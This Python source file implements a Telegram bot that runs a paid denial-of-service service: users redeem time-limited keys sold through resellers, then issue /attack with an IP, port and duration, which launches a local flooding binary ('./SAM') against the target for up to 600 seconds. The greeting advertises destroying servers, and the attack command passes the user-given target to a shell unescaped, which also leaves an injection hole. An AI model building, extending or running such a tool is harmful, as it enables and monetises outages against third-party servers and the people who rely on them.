#!/usr/bin/python3

import requests
import subprocess
import telebot
import datetime
import os
import time
import secrets
import threading
from datetime import timedelta
from threading import Timer
import pytz
import stat

# Ensure SAM is executable
if os.path.exists("SAM"):
    os.chmod("SAM", stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

API_KEY = "YOUR_EXTERNAL_API_KEY"
ADMIN_IDS = {"7212246299"}

USER_FILE        = "users.txt"
LOG_FILE         = "log.txt"
USER_ACCESS_FILE = "users_access.txt"
KEYS_FILE        = "keys.txt"
RESELLERS_FILE   = "resellers.txt"
BALANCE_FILE     = "balances.txt"

ist = pytz.timezone('Asia/Kolkata')

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEY PLANS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KEY_PLANS = {
    "12hr":  {"duration": timedelta(hours=12), "cost": 30},
    "1day":  {"duration": timedelta(days=1),   "cost": 60},
    "3day":  {"duration": timedelta(days=3),   "cost": 180},
    "7day":  {"duration": timedelta(days=7),   "cost": 300},
    "30day": {"duration": timedelta(days=30),  "cost": 1000},
    "60day": {"duration": timedelta(days=60),  "cost": 1900},
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FILE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def read_users() -> list:
    try:
        with open(USER_FILE, "r") as f:
            return [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        return []

def save_users(users: list):
    with open(USER_FILE, "w") as f:
        for uid in users:
            f.write(f"{uid}\n")

def read_user_access() -> dict:
    data = {}
    try:
        with open(USER_ACCESS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, expiry = line.split(":", 1)
                    data[uid] = {"expiry_time": float(expiry)}
    except FileNotFoundError:
        pass
    return data

def save_user_access(data: dict):
    with open(USER_ACCESS_FILE, "w") as f:
        for uid, info in data.items():
            f.write(f"{uid}:{info['expiry_time']}\n")

def read_keys() -> dict:
    keys = {}
    try:
        with open(KEYS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if "|" in line:
                    parts = line.split("|", 1)
                    keys[parts[0].strip()] = parts[1].strip()
    except FileNotFoundError:
        pass
    return keys

def save_keys(keys: dict):
    with open(KEYS_FILE, "w") as f:
        for key, plan in keys.items():
            f.write(f"{key}|{plan}\n")

def read_resellers() -> set:
    try:
        with open(RESELLERS_FILE, "r") as f:
            return {l.strip() for l in f if l.strip()}
    except FileNotFoundError:
        return set()

def save_resellers(resellers: set):
    with open(RESELLERS_FILE, "w") as f:
        for uid in resellers:
            f.write(f"{uid}\n")

def read_balances() -> dict:
    balances = {}
    try:
        with open(BALANCE_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, bal = line.split(":", 1)
                    try:
                        balances[uid.strip()] = int(bal.strip())
                    except ValueError:
                        balances[uid.strip()] = 0
    except FileNotFoundError:
        pass
    return balances

def save_balances(balances: dict):
    with open(BALANCE_FILE, "w") as f:
        for uid, bal in balances.items():
            f.write(f"{uid}:{bal}\n")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  STATE & COOLDOWN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
allowed_user_ids: list = read_users()
user_access: dict      = read_user_access()
active_keys: dict      = read_keys()
RESELLER_IDS: set      = read_resellers()
balances: dict         = read_balances()
bgmi_cooldown = {} 

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def fmt_expiry(ts: float) -> str:
    return datetime.datetime.fromtimestamp(ts, tz=ist).strftime('%d %b %Y • %I:%M %p IST')

def generate_key() -> str:
    return "KEY-" + secrets.token_hex(10).upper()

def is_admin(uid: str) -> bool:
    return uid in ADMIN_IDS

def is_reseller(uid: str) -> bool:
    return uid in RESELLER_IDS

def is_admin_or_reseller(uid: str) -> bool:
    return is_admin(uid) or is_reseller(uid)

def get_balance(uid: str) -> int:
    return balances.get(uid, 0)

# FIXED: Removed bot.get_chat() to prevent Telegram API crashes
def log_action(user_id: str, action: str, message=None):
    if message and message.from_user.username:
        username = f"@{message.from_user.username}"
    else:
        username = f"ID:{user_id}"
        
    now = datetime.datetime.now(ist).strftime("%d-%m-%Y %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{now}] {username} | {action}\n")

def clear_logs() -> str:
    if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
        return "No logs to clear."
    open(LOG_FILE, "w").close()
    return "✅  Logs cleared."

def no_access_msg() -> str:
    return (
        "╔══════════════════════╗\n"
        "║   🚫  ACCESS DENIED   ║\n"
        "╚══════════════════════╝\n\n"
        "You don't have an active plan.\n"
        "Use /redeem <key> to activate access."
    )

def admin_only_msg() -> str:
    return "⛔  This command is restricted to admins only."

def admin_reseller_only_msg() -> str:
    return "⛔  This command is restricted to admins and resellers only."

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  EXPIRY MANAGEMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def remove_expired_users():
    current_time = time.time()
    expired = [uid for uid, info in user_access.items()
               if info["expiry_time"] <= current_time]

    for uid in expired:
        try:
            bot.send_message(uid,
                "╔══════════════════════╗\n"
                "║   ⏰  PLAN EXPIRED    ║\n"
                "╚══════════════════════╝\n\n"
                "Your access plan has ended.\n\n"
                "🔑  Use /redeem <key> with a new key\n"
                "    to reactivate your access."
            )
        except Exception:
            pass
        user_access.pop(uid, None)
        if uid in allowed_user_ids:
            allowed_user_ids.remove(uid)

    if expired:
        save_users(allowed_user_ids)
        save_user_access(user_access)

    Timer(60, remove_expired_users).start()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HANDLERS — General
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = (
        "🚀 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁</b> 🚀\n\n"
        "👑 <b>𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁</b>\n\n"
        "🎯 /attack [ip] [port] [time] - Start Attack\n"
        "📊 /status - Live Attack Status\n"
        "📦 /myplan - Check Your Plan\n"
        "❓ /help - Commands Menu\n\n"
        "🔥 <i>𝘓𝘦𝘵'𝘴 𝘥𝘦𝘴𝘵𝘳𝘰𝘺 𝘴𝘰𝘮𝘦 𝘴𝘦𝘳𝘃𝘦𝘳𝘴!</i>"
    )
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['help'])
def show_help(message):
    bot.reply_to(message,
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "      📋  COMMANDS\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  👤 USER COMMANDS\n"
        "  /start    → Welcome screen\n"
        "  /id       → Account info\n"
        "  /plan     → Plan expiry\n"
        "  /redeem   → Activate a key\n"
        "  /mylogs   → Your activity\n"
        "  /rules    → Usage rules\n"
        "  /status   → Bot status\n\n"
        "  🤝 RESELLER & ADMIN\n"
        "  /prices   → Key price list\n"
        "  /genkey   → Generate key\n"
        "  /listkeys → List unused keys\n"
        "  /deletekey→ Delete a key\n"
        "  /balance  → Check balance\n\n"
        "  🛠 ADMIN ONLY\n"
        "  /admincmd → View admin panel\n"
        "  /add      → Add user directly\n"
        "  /remove   → Remove a user\n"
        "  /allusers → List all users\n"
        "  /addreseller → Add a reseller\n"
        "  /rmreseller  → Remove reseller\n"
        "  /resellers   → List resellers\n"
        "  /addbalance  → Add funds\n"
        "  /setbalance  → Set funds\n"
        "  /broadcast   → Send msg to all\n"
        "  /logs         → Get log file\n"
        "  /clearlogs   → Clear log file\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['status'])
def bot_status(message):
    now = datetime.datetime.now(ist).strftime('%d %b %Y • %I:%M %p')
    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"      🟢  BOT STATUS\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Status   →  Online ✅\n"
        f"  Uptime   →  24 × 7\n"
        f"  Time     →  {now}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['rules'])
def show_rules(message):
    bot.reply_to(message,
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "        📜  RULES\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  1.  Do not share your key.\n"
        "  2.  One key = one account.\n"
        "  3.  Keys are non-refundable.\n"
        "  4.  Use /plan to check expiry.\n"
        "  5.  Violations may result in ban.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['prices'])
def show_prices(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        bot.reply_to(message, admin_reseller_only_msg())
        return

    lines = [
        "━━━━━━━━━━━━━━━━━━━━━━",
        "    💰  KEY PRICE LIST",
        "━━━━━━━━━━━━━━━━━━━━━━",
        "",
        "  Plan      Duration    Price",
        "  ──────────────────────────",
    ]
    plan_display = {
        "12hr":  "12 Hours ",
        "1day":  "1 Day    ",
        "3day":  "3 Days   ",
        "7day":  "7 Days   ",
        "30day": "30 Days  ",
        "60day": "60 Days  ",
    }
    for plan, info in KEY_PLANS.items():
        label = plan_display.get(plan, plan.ljust(9))
        cost  = info["cost"]
        lines.append(f"  {plan.ljust(8)}  {label}  ₹{cost}")
    lines += [
        "",
        "  Use /genkey <plan> to generate",
        "",
        "━━━━━━━━━━━━━━━━━━━━━━"
    ]
    bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['id'])
def show_user_info(message):
    user_id  = str(message.chat.id)
    username = f"@{message.from_user.username}" if message.from_user.username else "—"
    role     = "Admin" if is_admin(user_id) else ("Reseller" if is_reseller(user_id) else "User")

    if user_id in user_access:
        expiry_line = f"  Expiry  →  {fmt_expiry(user_access[user_id]['expiry_time'])}"
    else:
        expiry_line = "  Expiry  →  No active plan"

    bal_line = ""
    if is_reseller(user_id):
        bal_line = f"\n  Balance →  ₹{get_balance(user_id)}"

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"    👤  ACCOUNT INFO\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  ID        →  {user_id}\n"
        f"  Username →  {username}\n"
        f"  Role      →  {role}\n"
        f"{expiry_line}"
        f"{bal_line}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['myplan', 'plan'])
def show_plan(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, no_access_msg())
        return
    if user_id in user_access:
        expiry = fmt_expiry(user_access[user_id]['expiry_time'])
        bot.reply_to(message,
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"      📅  YOUR PLAN\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"  Status   →  Active ✅\n"
            f"  Expires  →  {expiry}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
    else:
        bot.reply_to(message, "⚠️  No expiry info found.")

@bot.message_handler(commands=['mylogs'])
def show_my_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, no_access_msg())
        return
    try:
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
        user_logs = [l for l in lines if f"ID:{user_id}" in l or (message.from_user.username and f"@{message.from_user.username}" in l)]
        if user_logs:
            bot.reply_to(message,
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "    📋  YOUR ACTIVITY\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                "".join(user_logs[-20:]) +
                "\n━━━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            bot.reply_to(message, "No activity found for your account.")
    except FileNotFoundError:
        bot.reply_to(message, "No logs found.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEY SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.chat.id)
    parts   = message.text.split()

    if len(parts) < 2:
        bot.reply_to(message, "Usage: /redeem <key>")
        return

    key = parts[1].strip().upper()

    if key not in active_keys:
        bot.reply_to(message, "❌ INVALID KEY. It is either wrong or already used.")
        return

    plan_label = active_keys[key]
    plan_info  = KEY_PLANS.get(plan_label)
    if not plan_info:
        bot.reply_to(message, "❌  Unknown plan on this key. Contact admin.")
        return

    now       = datetime.datetime.now(ist)
    expiry_ts = (now + plan_info["duration"]).timestamp()

    if user_id not in allowed_user_ids:
        allowed_user_ids.append(user_id)
        with open(USER_FILE, "a") as f:
            f.write(f"{user_id}\n")

    user_access[user_id] = {"expiry_time": expiry_ts}
    save_user_access(user_access)

    del active_keys[key]
    save_keys(active_keys)

    log_action(user_id, f"Redeemed key | plan={plan_label}", message)

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"    ✅  KEY ACTIVATED\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Plan      →  {plan_label}\n"
        f"  Expires  →  {fmt_expiry(expiry_ts)}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['genkey'])
def gen_key(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        bot.reply_to(message, admin_reseller_only_msg())
        return

    parts = message.text.split()
    if len(parts) < 2 or parts[1] not in KEY_PLANS:
        bot.reply_to(message,
            f"Usage: /genkey <plan>\n"
            f"Plans: {', '.join(KEY_PLANS.keys())}"
        )
        return

    plan      = parts[1]
    plan_info = KEY_PLANS[plan]
    cost      = plan_info["cost"]

    if is_reseller(user_id) and not is_admin(user_id):
        current_bal = get_balance(user_id)
        if current_bal < cost:
            bot.reply_to(message, f"❌ INSUFFICIENT BALANCE.\nNeeded: ₹{cost}\nBalance: ₹{current_bal}")
            return
        balances[user_id] = current_bal - cost
        save_balances(balances)

    key = generate_key()
    active_keys[key] = plan
    save_keys(active_keys)
    log_action(user_id, f"Generated key | plan={plan} | cost=₹{cost}", message)

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"    🔑  KEY GENERATED\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Key      →  <code>{key}</code>\n"
        f"  Plan     →  {plan}\n\n"
        f"  Tap to copy the key above.\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        bot.reply_to(message, admin_reseller_only_msg())
        return
    if not active_keys:
        bot.reply_to(message, "No unused keys available.")
        return
    
    lines = ["━━━━━━━━━━━━━━━━━━━━━━", "    🔑  UNUSED KEYS", "━━━━━━━━━━━━━━━━━━━━━━", ""]
    for k, plan in active_keys.items():
        lines.append(f"  {k}  [{plan}]")
        
    response_text = "\n".join(lines)
    if len(response_text) > 4000: response_text = response_text[:4000] + "\n... (Truncated)"
    bot.reply_to(message, response_text)

@bot.message_handler(commands=['deletekey'])
def delete_key(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        bot.reply_to(message, admin_reseller_only_msg())
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /deletekey <key>")
        return
    key = parts[1].strip().upper()
    if key in active_keys:
        del active_keys[key]
        save_keys(active_keys)
        bot.reply_to(message, f"✅  Key deleted.")
    else:
        bot.reply_to(message, "❌  Key not found.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BALANCE SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /addbalance <userId> <amount>")
        return

    target = parts[1]
    try:
        amount = int(parts[2])
        if amount <= 0: raise ValueError
    except ValueError:
        bot.reply_to(message, "❌ Amount must be a positive number.")
        return

    if target not in RESELLER_IDS:
        bot.reply_to(message, "❌ This user is not a reseller.")
        return

    balances[target] = get_balance(target) + amount
    save_balances(balances)
    log_action(user_id, f"Added ₹{amount} balance to reseller={target}", message)
    bot.reply_to(message, f"✅ Added ₹{amount} to {target}. New Balance: ₹{get_balance(target)}")

@bot.message_handler(commands=['setbalance'])
def set_balance(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /setbalance <userId> <amount>")
        return

    target = parts[1]
    try:
        amount = int(parts[2])
        if amount < 0: raise ValueError
    except ValueError:
        bot.reply_to(message, "❌ Amount must be 0 or more.")
        return

    balances[target] = amount
    save_balances(balances)
    log_action(user_id, f"Set balance of reseller={target} to ₹{amount}", message)
    bot.reply_to(message, f"✅ Balance for {target} set to ₹{amount}.")

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    parts = message.text.split()
    if is_admin(user_id) and len(parts) > 1:
        target = parts[1]
        bot.reply_to(message, f"💰 Reseller {target} Balance: ₹{get_balance(target)}")
        return

    if not is_reseller(user_id): return
    bot.reply_to(message, f"💰 Your Balance: ₹{get_balance(user_id)}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ADMIN — User Management
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    parts = message.text.split()
    if len(parts) < 3 or parts[2] not in KEY_PLANS:
        bot.reply_to(message, f"Usage: /add <userId> <plan>\nPlans: {', '.join(KEY_PLANS.keys())}")
        return

    target    = parts[1]
    plan      = parts[2]
    expiry_ts = (datetime.datetime.now(ist) + KEY_PLANS[plan]["duration"]).timestamp()

    if target not in allowed_user_ids:
        allowed_user_ids.append(target)
        with open(USER_FILE, "a") as f: f.write(f"{target}\n")
        prefix = "✅ User added."
    else:
        prefix = "🔄 Access updated."

    user_access[target] = {"expiry_time": expiry_ts}
    save_user_access(user_access)
    log_action(user_id, f"Added user={target} plan={plan}", message)
    bot.reply_to(message, f"{prefix}\nID: {target}\nExpires: {fmt_expiry(expiry_ts)}")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "Usage: /remove <userId>")
    
    target = parts[1]
    if target in allowed_user_ids:
        allowed_user_ids.remove(target)
        user_access.pop(target, None)
        save_users(allowed_user_ids)
        save_user_access(user_access)
        log_action(user_id, f"Removed user={target}", message)
        bot.reply_to(message, f"✅ User {target} removed.")
    else:
        bot.reply_to(message, "❌ User not found.")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    if not allowed_user_ids: return bot.reply_to(message, "No authorized users.")
    
    # FIXED: Removed get_chat() to prevent crash on large lists
    lines = ["━━━━━━━━━━━━━━━━━━━━━━", "    👥  AUTHORIZED USERS", "━━━━━━━━━━━━━━━━━━━━━━", ""]
    for uid in allowed_user_ids:
        expiry_info = f"  [{fmt_expiry(user_access[uid]['expiry_time'])}]" if uid in user_access else "  [No expiry]"
        lines.append(f"  ID:{uid}{expiry_info}")
        
    response_text = "\n".join(lines)
    if len(response_text) > 4000: response_text = response_text[:4000] + "\n... (Truncated)"
    bot.reply_to(message, response_text)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ADMIN — Reseller Management
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "Usage: /addreseller <userId>")
    
    target = parts[1]
    RESELLER_IDS.add(target)
    save_resellers(RESELLER_IDS)
    if target not in balances:
        balances[target] = 0
        save_balances(balances)
        
    log_action(user_id, f"Added reseller={target}", message)
    bot.reply_to(message, f"✅ Reseller {target} added with ₹0 balance.")

@bot.message_handler(commands=['rmreseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "Usage: /rmreseller <userId>")
    
    target = parts[1]
    if target in RESELLER_IDS:
        RESELLER_IDS.discard(target)
        save_resellers(RESELLER_IDS)
        log_action(user_id, f"Removed reseller={target}", message)
        bot.reply_to(message, f"✅ Reseller {target} removed.")

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    if not RESELLER_IDS: return bot.reply_to(message, "No resellers found.")
    
    # FIXED: Removed get_chat()
    lines = ["━━━━━━━━━━━━━━━━━━━━━━", "      🤝  RESELLERS", "━━━━━━━━━━━━━━━━━━━━━━", ""]
    for uid in RESELLER_IDS:
        lines.append(f"  ID:{uid}  →  ₹{get_balance(uid)}")
        
    response_text = "\n".join(lines)
    if len(response_text) > 4000: response_text = response_text[:4000] + "\n... (Truncated)"
    bot.reply_to(message, response_text)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ADMIN — Logs & Broadcast
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['logs'])
def send_logs(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_cmd(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    bot.reply_to(message, clear_logs())

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return

    text = f"━━━━━━━━━━━━━━━━━━━━━━\n      📢  𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n━━━━━━━━━━━━━━━━━━━━━━\n\n{parts[1]}\n\n━━━━━━━━━━━━━━━━━━━━━━"

    all_targets = list(set(read_users()) | set(read_resellers()) | ADMIN_IDS)
    success, fail = 0, 0
    for target in all_targets:
        try:
            bot.send_message(target, text)
            success += 1
            time.sleep(0.1) # Prevent Telegram flood limit
        except Exception:
            fail += 1

    bot.reply_to(message, f"📢 Broadcast Done\n✅ Sent: {success}\n❌ Failed: {fail}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ATTACK SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# FIXED: Removed bot.get_chat()
def log_command(message, target, port, time_val):
    user_id = str(message.chat.id)
    username = f"@{message.from_user.username}" if message.from_user.username else f"ID:{user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_val}\n\n")

# Background thread to prevent bot freeze
def run_attack_background(chat_id, target, port, time_val):
    full_command = f"./SAM {target} {port} {time_val} 500"
    subprocess.run(full_command, shell=True)
    bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")

@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id not in allowed_user_ids:
        bot.reply_to(message, no_access_msg())
        return

    if not is_admin(user_id):
        if user_id in bgmi_cooldown:
            # FIXED: Accurate cooldown calculation
            time_passed = (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds()
            if time_passed < 60:
                bot.reply_to(message, f"⏳ Cooldown! Wait {int(60 - time_passed)}s.")
                return

    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        try:
            port = int(command[2])
            time_val = int(command[3])
        except ValueError:
            bot.reply_to(message, "❌ Port and Time must be numbers.")
            return

        if time_val > 600:
            bot.reply_to(message, "❌ Max time is 600s.")
            return

        bgmi_cooldown[user_id] = datetime.datetime.now()
        
        log_command(message, target, port, time_val)
        
        username = message.from_user.username if message.from_user.username else message.from_user.first_name
        bot.reply_to(message, f"{username}, 🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")
        
        # FIXED: Run attack in background so other users' commands don't freeze
        threading.Thread(target=run_attack_background, args=(message.chat.id, target, port, time_val)).start()

    else:
        bot.reply_to(message, "✅ Usage: /attack <ip> <port> <time>")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    remove_expired_users()
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print("   ✅  Bot is running smoothly")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    bot.infinity_polling(timeout=30, long_polling_timeout=20)
